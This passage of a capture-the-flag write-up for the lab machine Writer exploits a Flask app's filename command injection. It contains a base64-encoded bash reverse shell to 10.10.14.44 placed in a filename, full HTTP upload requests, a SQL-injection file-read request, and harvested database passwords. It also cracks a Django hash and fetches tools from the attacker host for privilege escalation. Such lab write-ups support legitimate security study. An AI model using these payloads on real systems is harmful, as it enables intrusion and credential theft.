+    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>not</span> (<span style=color:#f1fa8c>&#39;user&#39;</span> <span style=color:#ff79c6>in</span> session):
+        <span style=color:#ff79c6>return</span> redirect(<span style=color:#f1fa8c>&#39;/&#39;</span>)
+    <span style=color:#ff79c6>try</span>:
+        connector <span style=color:#ff79c6>=</span> connections()
+    <span style=color:#ff79c6>except</span> mysql<span style=color:#ff79c6>.</span>connector<span style=color:#ff79c6>.</span>Error <span style=color:#ff79c6>as</span> err:
+            <span style=color:#ff79c6>return</span> (<span style=color:#f1fa8c>&#34;Database error&#34;</span>)
+    <span style=color:#ff79c6>if</span> request<span style=color:#ff79c6>.</span>method <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#34;POST&#34;</span>:
+        cursor <span style=color:#ff79c6>=</span> connector<span style=color:#ff79c6>.</span>cursor()
+        cursor<span style=color:#ff79c6>.</span>execute(<span style=color:#f1fa8c>&#34;SELECT * FROM stories where id = </span><span style=color:#f1fa8c>%(id)s</span><span style=color:#f1fa8c>;&#34;</span>, {<span style=color:#f1fa8c>&#39;id&#39;</span>: <span style=color:#8be9fd;font-style:italic>id</span>})
+        results <span style=color:#ff79c6>=</span> cursor<span style=color:#ff79c6>.</span>fetchall()
+        <span style=color:#ff79c6>if</span> request<span style=color:#ff79c6>.</span>files[<span style=color:#f1fa8c>&#39;image&#39;</span>]:
+            image <span style=color:#ff79c6>=</span> request<span style=color:#ff79c6>.</span>files[<span style=color:#f1fa8c>&#39;image&#39;</span>]
+            <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#34;.jpg&#34;</span> <span style=color:#ff79c6>in</span> image<span style=color:#ff79c6>.</span>filename:
+                path <span style=color:#ff79c6>=</span> os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>join(<span style=color:#f1fa8c>&#39;/var/www/writer.htb/writer/static/img/&#39;</span>, image<span style=color:#ff79c6>.</span>filename)
+                image<span style=color:#ff79c6>.</span>save(path)
+                image <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;/img/</span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(image<span style=color:#ff79c6>.</span>filename)
+                cursor <span style=color:#ff79c6>=</span> connector<span style=color:#ff79c6>.</span>cursor()
+                cursor<span style=color:#ff79c6>.</span>execute(<span style=color:#f1fa8c>&#34;UPDATE stories SET image = </span><span style=color:#f1fa8c>%(image)s</span><span style=color:#f1fa8c> WHERE id = </span><span style=color:#f1fa8c>%(id)s</span><span style=color:#f1fa8c>&#34;</span>, {<span style=color:#f1fa8c>&#39;image&#39;</span>:image, <span style=color:#f1fa8c>&#39;id&#39;</span>:<span style=color:#8be9fd;font-style:italic>id</span>})
+                result <span style=color:#ff79c6>=</span> connector<span style=color:#ff79c6>.</span>commit()
+            <span style=color:#ff79c6>else</span>:
+                error <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;File extensions must be in .jpg!&#34;</span>
+                <span style=color:#ff79c6>return</span> render_template(<span style=color:#f1fa8c>&#39;edit.html&#39;</span>, error<span style=color:#ff79c6>=</span>error, results<span style=color:#ff79c6>=</span>results, <span style=color:#8be9fd;font-style:italic>id</span><span style=color:#ff79c6>=</span><span style=color:#8be9fd;font-style:italic>id</span>)
+        <span style=color:#ff79c6>if</span> request<span style=color:#ff79c6>.</span>form<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>&#39;image_url&#39;</span>):
+            image_url <span style=color:#ff79c6>=</span> request<span style=color:#ff79c6>.</span>form<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>&#39;image_url&#39;</span>)
+            <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#34;.jpg&#34;</span> <span style=color:#ff79c6>in</span> image_url:
+                <span style=color:#ff79c6>try</span>:
+                    local_filename, headers <span style=color:#ff79c6>=</span> urllib<span style=color:#ff79c6>.</span>request<span style=color:#ff79c6>.</span>urlretrieve(image_url)
+                    os<span style=color:#ff79c6>.</span>system(<span style=color:#f1fa8c>&#34;mv </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c> </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>.jpg&#34;</span><span style=color:#ff79c6>.</span>format(local_filename, local_filename))
+                    image <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>.jpg&#34;</span><span style=color:#ff79c6>.</span>format(local_filename)
+                    <span style=color:#ff79c6>try</span>:
+                        im <span style=color:#ff79c6>=</span> Image<span style=color:#ff79c6>.</span>open(image)
+                        im<span style=color:#ff79c6>.</span>verify()
+                        im<span style=color:#ff79c6>.</span>close()
+                        image <span style=color:#ff79c6>=</span> image<span style=color:#ff79c6>.</span>replace(<span style=color:#f1fa8c>&#39;/tmp/&#39;</span>,<span style=color:#f1fa8c>&#39;&#39;</span>)
+                        os<span style=color:#ff79c6>.</span>system(<span style=color:#f1fa8c>&#34;mv /tmp/</span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c> /var/www/writer.htb/writer/static/img/</span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(image, image))
+                        image <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;/img/</span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(image)
+                        cursor <span style=color:#ff79c6>=</span> connector<span style=color:#ff79c6>.</span>cursor()
+                        cursor<span style=color:#ff79c6>.</span>execute(<span style=color:#f1fa8c>&#34;UPDATE stories SET image = </span><span style=color:#f1fa8c>%(image)s</span><span style=color:#f1fa8c> WHERE id = </span><span style=color:#f1fa8c>%(id)s</span><span style=color:#f1fa8c>&#34;</span>, {<span style=color:#f1fa8c>&#39;image&#39;</span>:image, <span style=color:#f1fa8c>&#39;id&#39;</span>:<span style=color:#8be9fd;font-style:italic>id</span>})
+                        result <span style=color:#ff79c6>=</span> connector<span style=color:#ff79c6>.</span>commit()
+
+                    <span style=color:#ff79c6>except</span> PIL<span style=color:#ff79c6>.</span>UnidentifiedImageError:
+                        os<span style=color:#ff79c6>.</span>system(<span style=color:#f1fa8c>&#34;rm </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(image))
+                        error <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;Not a valid image file!&#34;</span>
+                        <span style=color:#ff79c6>return</span> render_template(<span style=color:#f1fa8c>&#39;edit.html&#39;</span>, error<span style=color:#ff79c6>=</span>error, results<span style=color:#ff79c6>=</span>results, <span style=color:#8be9fd;font-style:italic>id</span><span style=color:#ff79c6>=</span><span style=color:#8be9fd;font-style:italic>id</span>)
+                <span style=color:#ff79c6>except</span>:
+                    error <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;Issue uploading picture&#34;</span>
+                    <span style=color:#ff79c6>return</span> render_template(<span style=color:#f1fa8c>&#39;edit.html&#39;</span>, error<span style=color:#ff79c6>=</span>error, results<span style=color:#ff79c6>=</span>results, <span style=color:#8be9fd;font-style:italic>id</span><span style=color:#ff79c6>=</span><span style=color:#8be9fd;font-style:italic>id</span>)
+            <span style=color:#ff79c6>else</span>:
+                error <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;File extensions must be in .jpg!&#34;</span>
+                <span style=color:#ff79c6>return</span> render_template(<span style=color:#f1fa8c>&#39;edit.html&#39;</span>, error<span style=color:#ff79c6>=</span>error, results<span style=color:#ff79c6>=</span>results, <span style=color:#8be9fd;font-style:italic>id</span><span style=color:#ff79c6>=</span><span style=color:#8be9fd;font-style:italic>id</span>)
+
+    [<span style=color:#ff79c6>..</span>snip<span style=color:#ff79c6>..</span>]
+
+<span style=color:#ff79c6>if</span> __name__ <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#39;__main__&#39;</span>:
+   app<span style=color:#ff79c6>.</span>run(<span style=color:#f1fa8c>&#34;0.0.0.0&#34;</span>)
+</code></pre></td></tr></table>
+</div>
+</div><p>There is a first vulnerabiity on row 28-29 : we can post an image with <code>request.files['image']</code> and it will be saved in <strong>/static/img</strong> as long as it contains <code>.jpg</code> in its name (it does not have to be the extension).</p>
+<pre><code>        if &quot;.jpg&quot; in image.filename:
+            path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
+</code></pre>
+<p>If we try to read the crafted fake jpg by passing its local uri in <code>request.form.get('image_url')</code>, then the code will fail to open the fake image with <code>im = Image.open(image)</code> at row 46 and an exception will be caught, resulting in the execution at row 51 of <code>os.system("rm {}".format(image))</code>. There is a clear command injection vulnerability here as we can craft a file with the format <code>somefile.jpg; COMMAND TO BE INJECTED;</code></p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>param</th>
+<th>fake_image_name</th>
+<th>what</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>First POST</td>
+<td>image</td>
+<td><code>somefile.jpg; COMMAND TO BE INJECTED;</code></td>
+<td>The fake image is saved in /var/www/writer.htb/writer/static/img/</td>
+</tr>
+<tr>
+<td>Second POST</td>
+<td>image_url</td>
+<td><code>file:///var/www/writer.htb/writer/static/img/somefile.jpg; COMMAND TO BE INJECTED;</code>'</td>
+<td>The injected command is executed</td>
+</tr>
+</tbody>
+</table>
+<p>Before going for this exploit, we can play with fuzzing for more files with this request:</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http>cat &gt; ffuf.txt &lt;&lt; EOF
+<span style=color:#50fa7b>POST</span> /administrative <span style=color:#ff79c6>HTTP</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>1.1</span>
+Host<span style=color:#ff79c6>:</span> writer.htb
+User-Agent<span style=color:#ff79c6>:</span> Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept<span style=color:#ff79c6>:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language<span style=color:#ff79c6>:</span> en-US,en;q=0.5
+Accept-Encoding<span style=color:#ff79c6>:</span> gzip, deflate
+Content-Type<span style=color:#ff79c6>:</span> application/x-www-form-urlencoded
+Content-Length<span style=color:#ff79c6>:</span> 94
+Origin<span style=color:#ff79c6>:</span> http://writer.htb
+Connection<span style=color:#ff79c6>:</span> close
+Referer<span style=color:#ff79c6>:</span> http://writer.htb/administrative
+Upgrade-Insecure-Requests<span style=color:#ff79c6>:</span> 1
+
+uname=&#39;+UNION+ALL+SELECT+1,LOAD_FILE(&#39;FUFF&#39;),3,4,5,6%3b--+-&amp;password=test
+EOF
+</code></pre></td></tr></table>
+</div>
+</div><p>FFUF works very well and super fast, but there is too many files to look at, including binaries.</p>
+<pre><code>ffuf -X POST -request ~/htb/writer/ffuf.txt \
+-w /opt/SecLists/Discovery/Web-Content/LinuxFileList.txt:FFUF \
+-t 200 -request-proto http -mode pitchfork -c -fs 608
+</code></pre>
+<h2 id=dashboard-exploitation-of-the-command-injection-vulnerability>Dashboard exploitation of the command injection vulnerability</h2>
+<h3 id=weaponization---exploit-payload>Weaponization - Exploit Payload</h3>
+<p>Once we have pass the login form with the SQL injection, we have access to the dashboard and the admin interface. We are allowed to publish an image to Stories, so we can attempt to upload instead an exploit. First we upload a real image, then we upload an exploit instead of the images.</p>
+<p>Exploit:</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#8be9fd;font-style:italic>echo</span> -n <span style=color:#f1fa8c>&#39;/bin/bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.44/443 0&gt;&amp;1&#34;&#39;</span> | base64
+L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvNDQzIDA+JjEi
+touch <span style=color:#f1fa8c>&#39;AAAA.jpg;`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvNDQzIDA+JjEi | base64 -d | bash `;&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>We can compare in Burp Comparer the requests for the real image uploaded vs. the exploit</p>
+<table>
+<thead>
+<tr>
+<th>header</th>
+<th>real image</th>
+<th>exploit</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Content-Type:</td>
+<td>image/jpeg</td>
+<td>application/octet-stream</td>
+</tr>
+</tbody>
+</table>
+<p>After replacing the <code>Content-Type: image/jpeg</code> in Burp Repeater, we are able to upload our exploit and we can indeed see it in <strong>/static/img/</strong> web folder.</p>
+<h3 id=exploit-delivery>Exploit Delivery</h3>
+<p>The below payload will leverage the <strong>image</strong> parameter to save the fake image with the command injection in /var/www/writer.htb/writer/static/img/.
+We can indeed verify the exploit is visible in <a href=http://writer.htb/static/img/>http://writer.htb/static/img/</a>.</p>
+<pre tabindex=0><code>POST /dashboard/stories/edit/40 HTTP/1.1
+Host: writer.htb
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------4229921975180160461559477084
+Content-Length: 887
+Origin: http://writer.htb
+Connection: close
+Referer: http://writer.htb/dashboard/stories/add
+Cookie: session=eyJ1c2VyIjoib29wcycgVU5JT04gQUxMIFNFTEVDVCAwLExPQURfRklMRSgnL2V0Yy9wYXNzd2QnKSwyLDMsNCw1OyAtLSJ9.YXcGzA.hMdP3TQOXXtXIROPFPWuVskHk7A
+Upgrade-Insecure-Requests: 1
+
+-----------------------------4229921975180160461559477084
+Content-Disposition: form-data; name=&quot;author&quot;
+
+AAAA
+-----------------------------4229921975180160461559477084
+Content-Disposition: form-data; name=&quot;title&quot;
+
+AAAA
+-----------------------------4229921975180160461559477084
+Content-Disposition: form-data; name=&quot;tagline&quot;
+
+AAAA
+-----------------------------4229921975180160461559477084
+Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;AAAA.jpg;`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvNDQzIDA+JjEi | base64 -d | bash`&quot;
+Content-Type: image/jpeg
+
+-----------------------------4229921975180160461559477084
+Content-Disposition: form-data; name=&quot;image_url&quot;
+
+-----------------------------4229921975180160461559477084
+Content-Disposition: form-data; name=&quot;content&quot;
+
+AAAA
+-----------------------------4229921975180160461559477084--
+</code></pre><h3 id=exploitation-of-the-command-injection>Exploitation of the Command Injection</h3>
+<p>The below payload will leverage the <strong>image_url</strong> paramater to execute the command injection stored in the previously delivered exploit filename. Before sending it with Repeater, we starts a netcat listener on port 443.</p>
+<pre tabindex=0><code>POST /dashboard/stories/edit/40 HTTP/1.1
+Host: writer.htb
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------4229921975180160461559477084
+Content-Length: 948
+Origin: http://writer.htb
+Connection: close
+Referer: http://writer.htb/dashboard/stories/add
+Cookie: session=eyJ1c2VyIjoib29wcycgVU5JT04gQUxMIFNFTEVDVCAwLExPQURfRklMRSgnL2V0Yy9wYXNzd2QnKSwyLDMsNCw1OyAtLSJ9.YXcGzA.hMdP3TQOXXtXIROPFPWuVskHk7A
+Upgrade-Insecure-Requests: 1
+
+-----------------------------4229921975180160461559477084
+Content-Disposition: form-data; name=&quot;author&quot;
+
+AAAA
+-----------------------------4229921975180160461559477084
+Content-Disposition: form-data; name=&quot;title&quot;
+
+AAAA
+-----------------------------4229921975180160461559477084
+Content-Disposition: form-data; name=&quot;tagline&quot;
+
+AAAA
+-----------------------------4229921975180160461559477084
+Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;aaa.jpg&quot;
+Content-Type: image/jpeg
+
+
+-----------------------------4229921975180160461559477084
+Content-Disposition: form-data; name=&quot;image_url&quot;
+
+file:///var/www/writer.htb/writer/static/img/AAAA.jpg;`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvNDQzIDA+JjEi | base64 -d | bash`
+
+-----------------------------4229921975180160461559477084
+Content-Disposition: form-data; name=&quot;content&quot;
+
+AAAA
+-----------------------------4229921975180160461559477084--
+</code></pre><p>and indeed we have a reverse shell we can upgrade:</p>
+<pre><code>nc -lnvp 443
+Listening on 0.0.0.0 443
+Connection received on 172.19.0.1 58164
+bash: cannot set terminal process group (1062): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@writer:/$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+^Z
+stty -a
+speed 38400 baud; rows 52; columns 178; line = 0;
+echo $TERM
+screen
+stty raw -echo; fg
+reset
+iwww-data@writer:/$ stty rows 52 columns 178
+</code></pre>
+<h3 id=shell-as-kyle>Shell as Kyle</h3>
+<pre><code>www-data@writer:/$ ss -lntpu
+Netid         State           Recv-Q          Send-Q                   Local Address:Port                   Peer Address:Port         Process
+udp           UNCONN          0               0                        127.0.0.53%lo:53                          0.0.0.0:*
+udp           UNCONN          0               0                         10.10.11.255:137                         0.0.0.0:*
+udp           UNCONN          0               0                         10.10.11.101:137                         0.0.0.0:*
+udp           UNCONN          0               0                              0.0.0.0:137                         0.0.0.0:*
+udp           UNCONN          0               0                         10.10.11.255:138                         0.0.0.0:*
+udp           UNCONN          0               0                         10.10.11.101:138                         0.0.0.0:*
+udp           UNCONN          0               0                              0.0.0.0:138                         0.0.0.0:*
+tcp           LISTEN          0               80                           127.0.0.1:3306                        0.0.0.0:*
+tcp           LISTEN          0               50                             0.0.0.0:139                         0.0.0.0:*
+tcp           LISTEN          0               10                           127.0.0.1:8080                        0.0.0.0:*             users:((&quot;python3&quot;,pid=29307,fd=4))
+tcp           LISTEN          0               4096                     127.0.0.53%lo:53                          0.0.0.0:*
+tcp           LISTEN          0               128                            0.0.0.0:22                          0.0.0.0:*
+tcp           LISTEN          0               100                          127.0.0.1:25                          0.0.0.0:*
+tcp           LISTEN          0               50                             0.0.0.0:445                         0.0.0.0:*
+tcp           LISTEN          0               50                                [::]:139                            [::]:*
+tcp           LISTEN          0               511                                  *:80                                *:*
+tcp           LISTEN          0               128                               [::]:22                             [::]:*
+tcp           LISTEN          0               50                                [::]:445                            [::]:*
+</code></pre>
+<p>Two services are accessible from localhost only: Mysql on port 3306 and SMTP on port 25. Exploring the writer database with <code>mysql -u admin -p -D writer</code> and password <code>ToughPasswordToCrack</code> was a distraction, there is nothing there apart an uncrackable admin hash.</p>
+<p>Looking at cron jobs there is a process running on port 8080</p>
+<pre><code>www-data@writer:/$ crontab -l
+[..]
+@reboot cd /var/www/writer2_project &amp;&amp; python3 manage.py runserver 127.0.0.1:8080
+</code></pre>
+<p>We have the source code available on /var/www/writer2_project/manage.py, and browsing at the django website, we find a reference to a SQL resource in /etc/mysql/my.cnf</p>
+<pre><code>www-data@writer:/$ cat /etc/mysql/my.cnf
+[..]
+[client]
+database = dev
+user = djangouser
+password = DjangoSuperPassword
+</code></pre>
+<p>We can get a hash for user kyle:</p>
+<pre><code>www-data@writer:/$ mysql -u djangouser -p -D dev
+Enter password:DjangoSuperPassword
+[..]
+MariaDB [dev]&gt; show tables;
+MariaDB [dev]&gt; describe auth_user;
+MariaDB [dev]&gt; select TO_BASE64(password), email from auth_user;
++---------------------------------------------------------------------------------------------------------------------------+-----------------+
+| TO_BASE64(password)                                                                                                       | email           |
++---------------------------------------------------------------------------------------------------------------------------+-----------------+
+| cGJrZGYyX3NoYTI1NiQyNjAwMDAkd0pPM3p0azBmT2xjYnNzblMxd0pQRCRiYlR5Q0I4ZFlXTUdZbHo0ZFNBcm96VFk3d2NaQ1M3RFY2bDVkcHVYTTRBPQ== | kyle@writer.htb |
++---------------------------------------------------------------------------------------------------------------------------+-----------------+
+</code></pre>
+<p>cracking the hash took roughly 7min without a GPU:</p>
+<pre><code>echo cGJrZGYyX3NoYTI1NiQyNjAwMDAkd0pPM3p0azBmT2xjYnNzblMxd0pQRCRiYlR5Q0I4ZFlXTUdZbHo0ZFNBcm96VFk3d2NaQ1M3RFY2bDVkcHVYTTRBPQ== | base64 -d &gt; ~/hashes.txt
+
+hashid -m ~/hashes.txt
+--File '/home/ctf/hashes.txt'--
+Analyzing 'pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A='
+[+] Django(PBKDF2-HMAC-SHA256) [Hashcat Mode: 10000]
+--End of file '/home/ctf/hashes.txt'-
+
+hashcat -m 10000 ~/hashes.txt  /opt/dictionaries/rockyou.txt --force
+hashcat -m 10000 ~/hashes.txt  /opt/dictionaries/rockyou.txt --force --show
+pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
+</code></pre>
+<p>We can ssh as kyle with the cracked password.</p>
+<pre><code>ssh kyle@writer.htb
+kyle@writer:~$ id
+uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
+kyle@writer:~$ crontab -l
+no crontab for kyle
+kyle@writer:~$ sudo -l
+[sudo] password for kyle:
+Sorry, user kyle may not run sudo on writer.
+kyle@writer:~$ cat user.txt
+04d7246f7b7852d619293975d8e5ac17
+</code></pre>
+<h2 id=kyle-to-john>Kyle to John</h2>
+<p>we can use linpeas to quickly discover more areas to investigate:</p>
+<pre><code>kyle@writer:/dev/shm/.a$ curl -Ok http://10.10.14.44/linpeas.sh.gz
+kyle@writer:/dev/shm/.a$ ./linpeas.sh
+</code></pre>
+<p>We can notice the <code>filter</code> group which relates to Postfix. Kyle belong to this group.</p>
+<pre><code>filter❌997:997:Postfix Filters:/var/spool/filter:/bin/sh
+john❌1001:1001:,,,:/home/john:/bin/bash
+kyle❌1000:1000:Kyle Travis:/home/kyle:/bin/bash
+root❌0:0:root:/root:/bin/bash
+</code></pre>
+<p>Some postfix processes are running as well:</p>
+<pre><code>kyle@writer:/dev/shm/.a$ ps -aux --forest
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+[..]
+root        2762  0.0  0.1  38036  4528 ?        Ss   05:03   0:00 /usr/lib/postfix/sbin/master -w
+postfix     2764  0.0  0.1  38500  6124 ?        S    05:03   0:00  \_ qmgr -l -t unix -u
+postfix     2769  0.0  0.2  42100  8764 ?        S    05:03   0:00  \_ tlsmgr -l -t unix -u -c
+postfix    31543  0.0  0.1  38304  6140 ?        S    15:03   0:00  \_ pickup -l -t unix -u -c
+</code></pre>
+<p><a href=https://github.com/DominicBreuker/pspy.git>pspy</a> does a great job to snoop unprivileged process:</p>
+<pre><code>curl -LOk https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
+python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+172.19.0.1 - - [28/Oct/2021 00:02:59] &quot;GET /pspy64s HTTP/1.1&quot; 200 -
+──────────────────────────────────────────────────────────────────────────
+kyle@writer:/dev/shm/.a$ curl -Os http://10.10.14.44/pspy64s
+kyle@writer:/dev/shm/.a$ chmod +x pspy64s &amp;&amp; ./pspy64s
+[..]
+2021/10/27 16:16:01 CMD: UID=0    PID=922685 | /usr/bin/cp /root/.scripts/master.cf /etc/postfix/master.cf
+2021/10/27 16:16:01 CMD: UID=0    PID=922684 | /usr/sbin/CRON -f
+2021/10/27 16:16:01 CMD: UID=0    PID=922686 | /usr/bin/cp /root/.scripts/disclaimer /etc/postfix/disclaimer
+2021/10/27 16:16:01 CMD: UID=0    PID=922687 | /usr/sbin/CRON -f
+</code></pre>
+<p>It highlights in yellow the three postfix processes we found earlier and if we are patient, it will show cron jobs as they are executed. Being a member of the group <code>filter</code>, we are authorised to modify the <strong>/etc/postfix/disclaimer</strong> which is used to append a disclaimer at the end of outgoing emails. Looking at the file, we can see it is in fact a bash script:</p>
+<pre><code>kyle@writer:~$ cat /etc/postfix/disclaimer
+</code></pre>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
